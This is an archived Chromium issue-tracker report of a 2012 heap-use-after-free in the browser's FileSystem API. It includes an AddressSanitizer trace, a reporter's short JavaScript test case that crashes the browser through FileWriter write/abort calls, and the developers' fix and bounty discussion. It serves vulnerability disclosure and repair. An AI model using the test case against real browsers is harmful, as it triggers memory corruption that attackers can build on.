# Heap-use-after-free in fileapi::FileSystemOperation::DidGetUsageAndQuotaAndRunTask

| Field | Value |
|-------|-------|
| **Issue ID** | [40058304](https://issues.chromium.org/issues/40058304) |
| **Status** | New |
| **Severity** | S3-Low |
| **Priority** | P0 |
| **Component** | Blink |
| **Reporter** | ax...@gmail.com |
| **Assignee** | ki...@chromium.org |
| **Created** | 2012-05-15 |
| **Bounty** | $3,133.00 |

## Description

**VULNERABILITY DETAILS**  

ASan reported heap-use-after-free in FileSystem file api. This is a browser crash.

**VERSION**  

21.0.1137.0 (136935) (Ubuntu 10.10)

# **FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**

==8101== ERROR: AddressSanitizer heap-use-after-free on address 0x7fa90022e290 at pc 0x7fa929dedd25 bp 0x7fa910ec4da0 sp 0x7fa910ec4d98  

WRITE of size 8 at 0x7fa90022e290 thread T11  

#0 0x7fa929dedd25 in fileapi::FileSystemOperationContext::set\_allowed\_bytes\_growth(long const&) ???:0  

#1 0x7fa929dedfad in fileapi::FileSystemOperation::DidGetUsageAndQuotaAndRunTask(fileapi::FileSystemOperation::TaskParamsForDidGetQuota const&, quota::QuotaStatusCode, long, long) /media/Chromium/chromium/depot\_tools/src/webkit/fileapi/file\_system\_operation.cc:500  

#2 0x7fa929df16af in base::internal::InvokeHelper<false, void, base::internal::RunnableAdapter<void (fileapi::FileSystemOperation::\*)(fileapi::FileSystemOperation::TaskParamsForDidGetQuota const&, quota::QuotaStatusCode, long, long)>, void ()(fileapi::FileSystemOperation\*, fileapi::FileSystemOperation::TaskParamsForDidGetQuota const&, quota::QuotaStatusCode const&, long const&, long const&)>::MakeItSo(base::internal::RunnableAdapter<void (fileapi::FileSystemOperation::\*)(fileapi::FileSystemOperation::TaskParamsForDidGetQuota const&, quota::QuotaStatusCode, long, long)>, fileapi::FileSystemOperation\*, fileapi::FileSystemOperation::TaskParamsForDidGetQuota const&, quota::QuotaStatusCode const&, long const&, long const&) /media/Chromium/chromium/depot\_tools/src/./base/bind\_internal.h:992  

#3 0x7fa929df146d in base::internal::Invoker<2, base::internal::BindState<base::internal::RunnableAdapter<void (fileapi::FileSystemOperation::\*)(fileapi::FileSystemOperation::TaskParamsForDidGetQuota const&, quota::QuotaStatusCode, long, long)>, void ()(fileapi::FileSystemOperation\*, fileapi::FileSystemOperation::TaskParamsForDidGetQuota const&, quota::QuotaStatusCode, long, long), void ()(base::internal::UnretainedWrapper[fileapi::FileSystemOperation](javascript:void(0);), fileapi::FileSystemOperation::TaskParamsForDidGetQuota)>, void ()(fileapi::FileSystemOperation\*, fileapi::FileSystemOperation::TaskParamsForDidGetQuota const&, quota::QuotaStatusCode, long, long)>::Run(base::internal::BindStateBase\*, quota::QuotaStatusCode const&, long const&, long const&) /media/Chromium/chromium/depot\_tools/src/./base/bind\_internal.h:1686  

#4 0x7fa929d425a9 in quota::CallGetUsageAndQuotaCallback(base::Callback<void ()(quota::QuotaStatusCode, long, long)> const&, bool, quota::QuotaStatusCode, quota::QuotaAndUsage const&) /media/Chromium/chromium/depot\_tools/src/webkit/quota/quota\_manager.cc:86  

#5 0x7fa929d51b00 in base::internal::InvokeHelper<false, void, base::internal::RunnableAdapter<void (\*)(base::Callback<void ()(quota::QuotaStatusCode, long, long)> const&, bool, quota::QuotaStatusCode, quota::QuotaAndUsage const&)>, void ()(base::Callback<void ()(quota::QuotaStatusCode, long, long)> const&, bool const&, quota::QuotaStatusCode const&, quota::QuotaAndUsage const&)>::MakeItSo(base::internal::RunnableAdapter<void (\*)(base::Callback<void ()(quota::QuotaStatusCode, long, long)> const&, bool, quota::QuotaStatusCode, quota::QuotaAndUsage const&)>, base::Callback<void ()(quota::QuotaStatusCode, long, long)> const&, bool const&, quota::QuotaStatusCode const&, quota::QuotaAndUsage const&) /media/Chromium/chromium/depot\_tools/src/./base/bind\_internal.h:958  

#6 0x7fa929d5aee6 in quota::QuotaManager::UsageAndQuotaDispatcherTask::CallCallbacksAndClear(quota::QuotaStatusCode, long, long, long, long) /media/Chromium/chromium/depot\_tools/src/webkit/quota/quota\_manager.cc:204  

#7 0x7fa929d5eaf0 in quota::QuotaManager::UsageAndQuotaDispatcherTaskForTemporary::DispatchCallbacks() /media/Chromium/chromium/depot\_tools/src/webkit/quota/quota\_manager.cc:393  

#8 0x7fa929d5c210 in quota::QuotaManager::UsageAndQuotaDispatcherTask::CheckCompleted() /media/Chromium/chromium/depot\_tools/src/webkit/quota/quota\_manager.cc:272  

#9 0x7fa929d5d82b in quota::QuotaManager::UsageAndQuotaDispatcherTask::DidGetHostUsage(std::basic\_string<char, std::char\_traits<char>, std::allocator<char> > const&, quota::StorageType, long) /media/Chromium/chromium/depot\_tools/src/webkit/quota/quota\_manager.cc:131  

#10 0x7fa929d5dd9c in base::internal::InvokeHelper<true, void, base::internal::RunnableAdapter<void (quota::QuotaManager::UsageAndQuotaDispatcherTask::\*)(std::basic\_string<char, std::char\_traits<char>, std::allocator<char> > const&, quota::StorageType, long)>, void ()(base::WeakPtr[quota::QuotaManager::UsageAndQuotaDispatcherTask](javascript:void(0);) const&, std::basic\_string<char, std::char\_traits<char>, std::allocator<char> > const&, quota::StorageType const&, long const&)>::MakeItSo(base::internal::RunnableAdapter<void (quota::QuotaManager::UsageAndQuotaDispatcherTask::\*)(std::basic\_string<char, std::char\_traits<char>, std::allocator<char> > const&, quota::StorageType, long)>, base::WeakPtr[quota::QuotaManager::UsageAndQuotaDispatcherTask](javascript:void(0);) const&, std::basic\_string<char, std::char\_traits<char>, std::allocator<char> > const&, quota::StorageType const&, long const&) /media/Chromium/chromium/depot\_tools/src/./base/bind\_internal.h:971  

#11 0x7fa929d6f73e in quota::CallbackQueue3<base::Callback<void ()(std::basic\_string<char, std::char\_traits<char>, std::allocator<char> > const&, quota::StorageType, long)>, std::basic\_string<char, std::char\_traits<char>, std::allocator<char> > const&, quota::StorageType, long>::Run(std::basic\_string<char, std::char\_traits<char>, std::allocator<char> > const&, quota::StorageType, long) /media/Chromium/chromium/depot\_tools/src/./webkit/quota/quota\_types.h:118  

#12 0x7fa929d6d742 in quota::CallbackQueueMap3<base::Callback<void ()(std::basic\_string<char, std::char\_traits<char>, std::allocator<char> > const&, quota::StorageType, long)>, std::basic\_string<char, std::char\_traits<char>, std::allocator<char> >, std::basic\_string<char, std::char\_traits<char>, std::allocator<char> > const&, quota::StorageType, long>::Run(std::basic\_string<char, std::char\_traits<char>, std::allocator<char> > const&, std::basic\_string<char, std::char\_traits<char>, std::allocator<char> > const&, quota::StorageType, long) /media/Chromium/chromium/depot\_tools/src/./webkit/quota/quota\_types.h:242  

#13 0x7fa929d6c7f5 in quota::UsageTracker::DidGetClientHostUsage(std::basic\_string<char, std::char\_traits<char>, std::allocator<char> > const&, quota::StorageType, long) /media/Chromium/chromium/depot\_tools/src/webkit/quota/usage\_tracker.cc:334  

#14 0x7fa929d7a84c in base::internal::InvokeHelper<true, void, base::internal::RunnableAdapter<void (quota::UsageTracker::\*)(std::basic\_string<char, std::char\_traits<char>, std::allocator<char> > const&, quota::StorageType, long)>, void ()(base::WeakPtr[quota::UsageTracker](javascript:void(0);) const&, std::basic\_string<char, std::char\_traits<char>, std::allocator<char> > const&, quota::StorageType const&, long const&)>::MakeItSo(base::internal::RunnableAdapter<void (quota::UsageTracker::\*)(std::basic\_string<char, std::char\_traits<char>, std::allocator<char> > const&, quota::StorageType, long)>, base::WeakPtr[quota::UsageTracker](javascript:void(0);) const&, std::basic\_string<char, std::char\_traits<char>, std::allocator<char> > const&, quota::StorageType const&, long const&) /media/Chromium/chromium/depot\_tools/src/./base/bind\_internal.h:971  

#15 0x7fa929d6f73e in quota::CallbackQueue3<base::Callback<void ()(std::basic\_string<char, std::char\_traits<char>, std::allocator<char> > const&, quota::StorageType, long)>, std::basic\_string<char, std::char\_traits<char>, std::allocator<char> > const&, quota::StorageType, long>::Run(std::basic\_string<char, std::char\_traits<char>, std::allocator<char> > const&, quota::StorageType, long) /media/Chromium/chromium/depot\_tools/src/./webkit/quota/quota\_types.h:118  

#16 0x7fa929d6d742 in quota::CallbackQueueMap3<base::Callback<void ()(std::basic\_string<char, std::char\_traits<char>, std::allocator<char> > const&, quota::StorageType, long)>, std::basic\_string<char, std::char\_traits<char>, std::allocator<char> >, std::basic\_string<char, std::char\_traits<char>, std::allocator<char> > const&, quota::StorageType, long>::Run(std::basic\_string<char, std::char\_traits<char>, std::allocator<char> > const&, std::basic\_string<char, std::char\_traits<char>, std::allocator<char> > const&, quota::StorageType, long) /media/Chromium/chromium/depot\_tools/src/./webkit/quota/quota\_types.h:242  

#17 0x7fa929d6f9f9 in quota::ClientUsageTracker::GatherHostUsageComplete(std::basic\_string<char, std::char\_traits<char>, std::allocator<char> > const&) /media/Chromium/chromium/depot\_tools/src/webkit/quota/usage\_tracker.cc:472  

#18 0x7fa929d60de1 in quota::QuotaTask::CallCompleted() /media/Chromium/chromium/depot\_tools/src/webkit/quota/quota\_task.cc:42  

#19 0x7fa929d7faa2 in quota::ClientUsageTracker::GatherUsageTaskBase::GetUsageForOrigins(std::set<GURL, std::less<GURL>, std::allocator<GURL> > const&, quota::StorageType) /media/Chromium/chromium/depot\_tools/src/webkit/quota/usage\_tracker.cc:61  

#20 0x7fa929d83d48 in base::internal::InvokeHelper<true, void, base::internal::RunnableAdapter<void (quota::ClientUsageTracker::GatherUsageTaskBase::\*)(std::set<GURL, std::less<GURL>, std::allocator<GURL> > const&, quota::StorageType)>, void ()(base::WeakPtr[quota::ClientUsageTracker::GatherUsageTaskBase](javascript:void(0);) const&, std::set<GURL, std::less<GURL>, std::allocator<GURL> > const&, quota::StorageType const&)>::MakeItSo(base::internal::RunnableAdapter<void (quota::ClientUsageTracker::GatherUsageTaskBase::\*)(std::set<GURL, std::less<GURL>, std::allocator<GURL> > const&, quota::StorageType)>, base::WeakPtr[quota::ClientUsageTracker::GatherUsageTaskBase](javascript:void(0);) const&, std::set<GURL, std::less<GURL>, std::allocator<GURL> > const&, quota::StorageType const&) /media/Chromium/chromium/depot\_tools/src/./base/bind\_internal.h:939  

#21 0x7fa929dbd276 in quota::CallbackQueue2<base::Callback<void ()(std::set<GURL, std::less<GURL>, std::allocator<GURL> > const&, quota::StorageType)>, std::set<GURL, std::less<GURL>, std::allocator<GURL> > const&, quota::StorageType>::Run(std::set<GURL, std::less<GURL>, std::allocator<GURL> > const&, quota::StorageType) /media/Chromium/chromium/depot\_tools/src/./webkit/quota/quota\_types.h:104  

#22 0x7fa929dbd549 in quota::CallbackQueueMap2<base::Callback<void ()(std::set<GURL, std::less<GURL>, std::allocator<GURL> > const&, quota::StorageType)>, std::basic\_string<char, std::char\_traits<char>, std::allocator<char> >, std::set<GURL, std::less<GURL>, std::allocator<GURL> > const&, quota::StorageType>::Run(std::basic\_string<char, std::char\_traits<char>, std::allocator<char> > const&, std::set<GURL, std::less<GURL>, std::allocator<GURL> > const&, quota::StorageType) /media/Chromium/chromium/depot\_tools/src/./webkit/quota/quota\_types.h:217  

#23 0x7fa929dbd3d0 in webkit\_database::DatabaseQuotaClient::DidGetOriginsForHost(std::basic\_string<char, std::char\_traits<char>, std::allocator<char> > const&, std::set<GURL, std::less<GURL>, std::allocator<GURL> > const&, quota::StorageType) /media/Chromium/chromium/depot\_tools/src/webkit/database/database\_quota\_client.cc:319  

#24 0x7fa929d60de1 in quota::QuotaTask::CallCompleted() /media/Chromium/chromium/depot\_tools/src/webkit/quota/quota\_task.cc:42  

#25 0x7fa929d642dc in base::internal::InvokeHelper<false, void, base::internal::RunnableAdapter<void (quota::QuotaTask::\*)()>, void ()(quota::QuotaThreadTask\* const&)>::MakeItSo(base::internal::RunnableAdapter<void (quota::QuotaTask::\*)()>, quota::QuotaThreadTask\* const&) /media/Chromium/chromium/depot\_tools/src/./base/bind\_internal.h:869  

#26 0x7fa926eaed03 in MessageLoop::RunTask(base::PendingTask const&) /media/Chromium/chromium/depot\_tools/src/base/message\_loop.cc:464  

#27 0x7fa926eaf469 in MessageLoop::DeferOrRunPendingTask(base::PendingTask const&) /media/Chromium/chromium/depot\_tools/src/base/message\_loop.cc:475  

#28 0x7fa926eaf782 in MessageLoop::DoWork() /media/Chromium/chromium/depot\_tools/src/base/message\_loop.cc:652  

#29 0x7fa926e47672 in base::MessagePumpLibevent::Run(base::MessagePump::Delegate\*) /media/Chromium/chromium/depot\_tools/src/base/message\_pump\_libevent.cc:242  

#30 0x7fa926eae4fc in MessageLoop::RunInternal() /media/Chromium/chromium/depot\_tools/src/base/message\_loop.cc:423  

#31 0x7fa926ead1f8 in MessageLoop::Run() /media/Chromium/chromium/depot\_tools/src/base/message\_loop.cc:306  

#32 0x7fa926f250f5 in base::Thread::ThreadMain() /media/Chromium/chromium/depot\_tools/src/base/threading/thread.cc:166  

#33 0x7fa926f19fbc in base::(anonymous namespace)::ThreadFunc(void\*) /media/Chromium/chromium/depot\_tools/src/base/threading/platform\_thread\_posix.cc:65  

#34 0x7fa92be013bc in \_\_asan::AsanThread::ThreadStart() ??:0  

0x7fa90022e290 is located 16 bytes inside of 336-byte region [0x7fa90022e280,0x7fa90022e3d0)  

freed by thread T11 here:  

#0 0x7fa92be04b32 in operator delete(void\*) ??:0  

#1 0x7fa929ded2c2 in fileapi::FileSystemOperation::Cancel(base::Callback<void ()(base::PlatformFileError)> const&) /media/Chromium/chromium/depot\_tools/src/webkit/fileapi/file\_system\_operation.cc:407  

#2 0x7fa92a79e92e in FileAPIMessageFilter::OnCancel(int, int) /media/Chromium/chromium/depot\_tools/src/content/browser/fileapi/fileapi\_message\_filter.cc:365  

#3 0x7fa92a79e730 in bool FileSystemHostMsg\_CancelWrite::Dispatch<FileAPIMessageFilter, FileAPIMessageFilter, void (FileAPIMessageFilter::\*)(int, int)>(IPC::Message const\*, FileAPIMessageFilter\*, FileAPIMessageFilter\*, void (FileAPIMessageFilter::\*)(int, int)) /media/Chromium/chromium/depot\_tools/src/./content/common/fileapi/file\_system\_messages.h:126  

#4 0x7fa92a79b60e in FileAPIMessageFilter::OnMessageReceived(IPC::Message const&, bool\*) /media/Chromium/chromium/depot\_tools/src/content/browser/fileapi/fileapi\_message\_filter.cc:145  

#5 0x7fa92a49586a in content::BrowserMessageFilter::DispatchMessage(IPC::Message const&) /media/Chromium/chromium/depot\_tools/src/content/public/browser/browser\_message\_filter.cc:136  

#6 0x7fa92a495439 in content::BrowserMessageFilter::OnMessageReceived(IPC::Message const&) /media/Chromium/chromium/depot\_tools/src/content/public/browser/browser\_message\_filter.cc:52  

#7 0x7fa926fa3762 in IPC::ChannelProxy::Context::TryFilters(IPC::Message const&) /media/Chromium/chromium/depot\_tools/src/ipc/ipc\_channel\_proxy.cc:71  

#8 0x7fa926fa3852 in IPC::ChannelProxy::Context::OnMessageReceived(IPC::Message const&) /media/Chromium/chromium/depot\_tools/src/ipc/ipc\_channel\_proxy.cc:85  

#9 0x7fa926fab1d7 in IPC::internal::ChannelReader::DispatchInputData(char const\*, int) /media/Chromium/chromium/depot\_tools/src/ipc/ipc\_channel\_reader.cc:76  

#10 0x7fa926faaeb0 in IPC::internal::ChannelReader::ProcessIncomingMessages() /media/Chromium/chromium/depot\_tools/src/ipc/ipc\_channel\_reader.cc:29  

#11 0x7fa926f9d4b8 in IPC::Channel::ChannelImpl::OnFileCanReadWithoutBlocking(int) /media/Chromium/chromium/depot\_tools/src/ipc/ipc\_channel\_posix.cc:795  

#12 0x7fa926e45cda in base::MessagePumpLibevent::FileDescriptorWatcher::OnFileCanReadWithoutBlocking(int, base::MessagePumpLibevent\*) /media/Chromium/chromium/depot\_tools/src/base/message\_pump\_libevent.cc:110  

#13 0x7fa926e47134 in base::MessagePumpLibevent::OnLibeventNotification(int, short, void\*) /media/Chromium/chromium/depot\_tools/src/base/message\_pump\_libevent.cc:368  

#14 0x7fa926f73e5a in event\_process\_active /media/Chromium/chromium/depot\_tools/src/third\_party/libevent/event.c:385  

#15 0x7fa926f7305d in event\_base\_loop /media/Chromium/chromium/depot\_tools/src/third\_party/libevent/event.c:526  

#16 0x7fa926e479ab in base::MessagePumpLibevent::Run(base::MessagePump::Delegate\*) /media/Chromium/chromium/depot\_tools/src/base/message\_pump\_libevent.cc:280  

#17 0x7fa926eae4fc in MessageLoop::RunInternal() /media/Chromium/chromium/depot\_tools/src/base/message\_loop.cc:423  

#18 0x7fa926ead1f8 in MessageLoop::Run() /media/Chromium/chromium/depot\_tools/src/base/message\_loop.cc:306  

#19 0x7fa926f250f5 in base::Thread::ThreadMain() /media/Chromium/chromium/depot\_tools/src/base/threading/thread.cc:166  

#20 0x7fa926f19fbc in base::(anonymous namespace)::ThreadFunc(void\*) /media/Chromium/chromium/depot\_tools/src/base/threading/platform\_thread\_posix.cc:65  

#21 0x7fa92be013bc in \_\_asan::AsanThread::ThreadStart() ??:0  

previously allocated by thread T11 here:  

#0 0x7fa92be049b2 in operator new(unsigned long) ??:0  

#1 0x7fa929ddb834 in fileapi::SandboxMountPointProvider::CreateFileSystemOperation(GURL const&, fileapi::FileSystemType, FilePath const&, fileapi::FileSystemContext\*) const /media/Chromium/chromium/depot\_tools/src/webkit/fileapi/sandbox\_mount\_point\_provider.cc:450  

#2 0x7fa929dca84c in fileapi::FileSystemContext::CreateFileSystemOperation(GURL const&) /media/Chromium/chromium/depot\_tools/src/webkit/fileapi/file\_system\_context.cc:179  

#3 0x7fa92a7a1bf8 in FileAPIMessageFilter::GetNewOperation(GURL const&, int) /media/Chromium/chromium/depot\_tools/src/content/browser/fileapi/fileapi\_message\_filter.cc:670  

#4 0x7fa92a79dd08 in FileAPIMessageFilter::OnWrite(int, GURL const&, GURL const&, long) /media/Chromium/chromium/depot\_tools/src/content/browser/fileapi/fileapi\_message\_filter.cc:318  

#5 0x7fa92a79dafa in bool FileSystemHostMsg\_Write::Dispatch<FileAPIMessageFilter, FileAPIMessageFilter, void (FileAPIMessageFilter::\*)(int, GURL const&, GURL const&, long)>(IPC::Message const\*, FileAPIMessageFilter\*, FileAPIMessageFilter\*, void (FileAPIMessageFilter::\*)(int, GURL const&, GURL const&, long)) /media/Chromium/chromium/depot\_tools/src/./content/common/fileapi/file\_system\_messages.h:106  

#6 0x7fa92a79b3a6 in FileAPIMessageFilter::OnMessageReceived(IPC::Message const&, bool\*) /media/Chromium/chromium/depot\_tools/src/content/browser/fileapi/fileapi\_message\_filter.cc:142  

#7 0x7fa92a49586a in content::BrowserMessageFilter::DispatchMessage(IPC::Message const&) /media/Chromium/chromium/depot\_tools/src/content/public/browser/browser\_message\_filter.cc:136  

#8 0x7fa92a495439 in content::BrowserMessageFilter::OnMessageReceived(IPC::Message const&) /media/Chromium/chromium/depot\_tools/src/content/public/browser/browser\_message\_filter.cc:52  

#9 0x7fa926fa3762 in IPC::ChannelProxy::Context::TryFilters(IPC::Message const&) /media/Chromium/chromium/depot\_tools/src/ipc/ipc\_channel\_proxy.cc:71  

#10 0x7fa926fa3852 in IPC::ChannelProxy::Context::OnMessageReceived(IPC::Message const&) /media/Chromium/chromium/depot\_tools/src/ipc/ipc\_channel\_proxy.cc:85  

#11 0x7fa926fab1d7 in IPC::internal::ChannelReader::DispatchInputData(char const\*, int) /media/Chromium/chromium/depot\_tools/src/ipc/ipc\_channel\_reader.cc:76  

#12 0x7fa926faaeb0 in IPC::internal::ChannelReader::ProcessIncomingMessages() /media/Chromium/chromium/depot\_tools/src/ipc/ipc\_channel\_reader.cc:29  

#13 0x7fa926f9d4b8 in IPC::Channel::ChannelImpl::OnFileCanReadWithoutBlocking(int) /media/Chromium/chromium/depot\_tools/src/ipc/ipc\_channel\_posix.cc:795  

#14 0x7fa926e45cda in base::MessagePumpLibevent::FileDescriptorWatcher::OnFileCanReadWithoutBlocking(int, base::MessagePumpLibevent\*) /media/Chromium/chromium/depot\_tools/src/base/message\_pump\_libevent.cc:110  

#15 0x7fa926e47134 in base::MessagePumpLibevent::OnLibeventNotification(int, short, void\*) /media/Chromium/chromium/depot\_tools/src/base/message\_pump\_libevent.cc:368  

#16 0x7fa926f73e5a in event\_process\_active /media/Chromium/chromium/depot\_tools/src/third\_party/libevent/event.c:385  

#17 0x7fa926f7305d in event\_base\_loop /media/Chromium/chromium/depot\_tools/src/third\_party/libevent/event.c:526  

#18 0x7fa926e479ab in base::MessagePumpLibevent::Run(base::MessagePump::Delegate\*) /media/Chromium/chromium/depot\_tools/src/base/message\_pump\_libevent.cc:280  

#19 0x7fa926eae4fc in MessageLoop::RunInternal() /media/Chromium/chromium/depot\_tools/src/base/message\_loop.cc:423  

#20 0x7fa926ead1f8 in MessageLoop::Run() /media/Chromium/chromium/depot\_tools/src/base/message\_loop.cc:306  

#21 0x7fa926f250f5 in base::Thread::ThreadMain() /media/Chromium/chromium/depot\_tools/src/base/threading/thread.cc:166  

#22 0x7fa926f19fbc in base::(anonymous namespace)::ThreadFunc(void\*) /media/Chromium/chromium/depot\_tools/src/base/threading/platform\_thread\_posix.cc:65  

Thread T11 created by T0 here:  

#0 0x7fa92bdf9b45 in pthread\_create ??:0  

#1 0x7fa926f19b56 in base::(anonymous namespace)::CreateThread(unsigned long, bool, base::PlatformThread::Delegate\*, unsigned long\*, base::ThreadPriority) /media/Chromium/chromium/depot\_tools/src/base/threading/platform\_thread\_posix.cc:127  

#2 0x7fa926f19a3d in base::PlatformThread::Create(unsigned long, base::PlatformThread::Delegate\*, unsigned long\*) /media/Chromium/chromium/depot\_tools/src/base/threading/platform\_thread\_posix.cc:249  

#3 0x7fa926f24a15 in base::Thread::StartWithOptions(base::Thread::Options const&) /media/Chromium/chromium/depot\_tools/src/base/threading/thread.cc:73  

#4 0x7fa92a4a853d in content::BrowserMainLoop::CreateThreads() /media/Chromium/chromium/depot\_tools/src/content/browser/browser\_main\_loop.cc:412  

#5 0x7fa92a4aaee7 in (anonymous namespace)::BrowserMainRunnerImpl::Initialize(content::MainFunctionParams const&) /media/Chromium/chromium/depot\_tools/src/content/browser/browser\_main\_runner.cc:86  

#6 0x7fa92a4a6602 in BrowserMain(content::MainFunctionParams const&) /media/Chromium/chromium/depot\_tools/src/content/browser/browser\_main.cc:17  

#7 0x7fa926d9882e in (anonymous namespace)::RunNamedProcessTypeMain(std::basic\_string<char, std::char\_traits<char>, std::allocator<char> > const&, content::MainFunctionParams const&, content::ContentMainDelegate\*) /media/Chromium/chromium/depot\_tools/src/content/app/content\_main\_runner.cc:292  

#8 0x7fa926d98230 in (anonymous namespace)::ContentMainRunnerImpl::Run() /media/Chromium/chromium/depot\_tools/src/content/app/content\_main\_runner.cc:571  

#9 0x7fa926d974bf in content::ContentMain(int, char const\*\*, content::ContentMainDelegate\*) /media/Chromium/chromium/depot\_tools/src/content/app/content\_main.cc:35  

#10 0x7fa925b1b847 in ChromeMain /media/Chromium/chromium/depot\_tools/src/chrome/app/chrome\_main.cc:32  

#11 0x7fa925b1b7ab in main /media/Chromium/chromium/depot\_tools/src/chrome/app/chrome\_exe\_main\_gtk.cc:18  

#12 0x7fa91e9b5d8e in \_\_libc\_start\_main /build/buildd/eglibc-2.12.1/csu/libc-start.c:258  

==8101== ABORTING  

Stats: 63M malloced (113M for red zones) by 398776 calls  

Stats: 5M realloced by 28140 calls  

Stats: 54M freed by 336744 calls  

Stats: 0M really freed by 0 calls  

Stats: 212M (54291 full pages) mmaped in 53 calls  

mmaps by size class: 8:360426; 9:32764; 10:20475; 11:6141; 12:3072; 13:1024; 14:768; 15:256; 16:256; 17:64; 18:16; 19:8; 20:4;  

mallocs by size class: 8:346839; 9:28011; 10:15763; 11:3599; 12:2725; 13:728; 14:643; 15:184; 16:229; 17:37; 18:14; 19:3; 20:1;  

frees by size class: 8:290490; 9:25128; 10:14742; 11:2667; 12:2199; 13:531; 14:589; 15:156; 16:200; 17:29; 18:10; 19:3;  

rfrees by size class:  

Stats: malloc large: 55 small slow: 1410  

Shadow byte and word:  

0x1ff520045c52: fd  

0x1ff520045c50: fd fd fd fd fd fd fd fd  

More shadow bytes:  

0x1ff520045c30: fd fd fd fd fd fd fd fd  

0x1ff520045c38: fd fd fd fd fd fd fd fd  

0x1ff520045c40: fa fa fa fa fa fa fa fa  

0x1ff520045c48: fa fa fa fa fa fa fa fa  

=>0x1ff520045c50: fd fd fd fd fd fd fd fd  

0x1ff520045c58: fd fd fd fd fd fd fd fd  

0x1ff520045c60: fd fd fd fd fd fd fd fd  

0x1ff520045c68: fd fd fd fd fd fd fd fd  

0x1ff520045c70: fd fd fd fd fd fd fd fd

## Timeline

### ax...@gmail.com (2012-05-15)

Working to get test-case.

### ax...@gmail.com (2012-05-15)

So, here is the test-case:

<script>
    var blob = new Blob([""]);

    function fwWrite(fe, fileWriter) {
        fileWriter.onabort = fileWriter.write(blob);
        fileWriter.onwritestart = fileWriter.abort();
        fileWriter.write(blob);
    }

    function feCallback(fe) {
        fe.createWriter(function(fileWriter) {
            fileWriter.onwrite = function() {
                fe.createWriter(function(fw) {fwWrite(fe, fw);});
            };
            fileWriter.truncate(0);
        }, null);
    }

    function fsCallback(fs) {
        fs.root.getFile('test', {create:true}, feCallback);
    }

    webkitRequestFileSystem(TEMPORARY, 1024, fsCallback);

</script>

### in...@chromium.org (2012-05-16)

this isnt reproducing on trunk ? are you running on chrome or drt ? any special repro intructions ?

### in...@chromium.org (2012-05-16)

Eric, Michael, is http://code.google.com/p/chromium/issues/detail?id=128266 a dupe of this ?

### ax...@gmail.com (2012-05-16)

Not sure why it does not reproducing - no extra flags are required - should just work. It's a regular build from trunk. Though does not work on Windows 7 on 21.0.1137.1 canary.

### er...@chromium.org (2012-05-16)

Inferno: this has nothing to do with 128266.  Infinite recursion is stopped here by protection in FileWriter::write--see kMaxRecursionDepth.

Kinuko: Could this be related to your recent fix in https://chromiumcodereview.appspot.com/10008047?  Or perhaps that problem hid this one?

### ki...@chromium.org (2012-05-17)

Eric, oh yes I think so.  Let me take a look at it.

### ki...@chromium.org (2012-05-17)

I'll take another look but I think this one will fix.
https://chromiumcodereview.appspot.com/10408006/

### in...@chromium.org (2012-05-17)

As per https://chromiumcodereview.appspot.com/10408006/, it seems to have regressed in https://src.chromium.org/viewvc/chrome?view=rev&revision=136513.

### bu...@chromium.org (2012-05-17)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/chrome?view=rev&revision=137635

------------------------------------------------------------------------
r137635 | kinuko@chromium.org | Wed May 16 23:23:39 PDT 2012

Changed paths:
 M http://src.chromium.org/viewvc/chrome/trunk/src/webkit/fileapi/file_system_operation.cc?r1=137635&r2=137634&pathrev=137635

Crash fix in fileapi::FileSystemOperation::DidGetUsageAndQuotaAndRunTask

https://chromiumcodereview.appspot.com/10008047 introduced delete-with-inflight-tasks in Write sequence but I failed to convert this callback to use WeakPtr().

BUG=128178
TEST=manual test

Review URL: https://chromiumcodereview.appspot.com/10408006
------------------------------------------------------------------------

### in...@chromium.org (2012-05-17)

Ax330d, can you please check if the patch fixes the crash for you. we were not able to reproduce it here.

### ax...@gmail.com (2012-05-18)

Ok, I will check later. Actually I have figured out why it could not work for you - I was launching test-case from the web-server. If I load it just as a file, it won't crash the browser.

### in...@chromium.org (2012-05-18)

Thanks Ax330d, that was an important piece of info. I can't reproduce on trunk from a web server, but please do check it too if you get a chance.

### ax...@gmail.com (2012-05-18)

Checked on 21.0.1142.0 (137843) - does not crash anymore.

### sc...@gmail.com (2012-05-18)

Isn't a browser UAF critical?

### js...@chromium.org (2012-05-19)

Arthur, just to confirm, this was a full browser crash, not a tab crash, yes?

### ax...@gmail.com (2012-05-19)

Yes, this was a full browser crash.

### sc...@gmail.com (2012-05-22)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-05-23)

Genuine web-triggered browser UAF. No real option here other than to reward $3133.7 -- nice repro and nice regression catch :D

### sc...@gmail.com (2012-07-09)

[Empty comment from Monorail migration]

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-14)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-01)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### is...@google.com (2016-10-02)

This issue was migrated from crbug.com/chromium/128178?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40058304)*
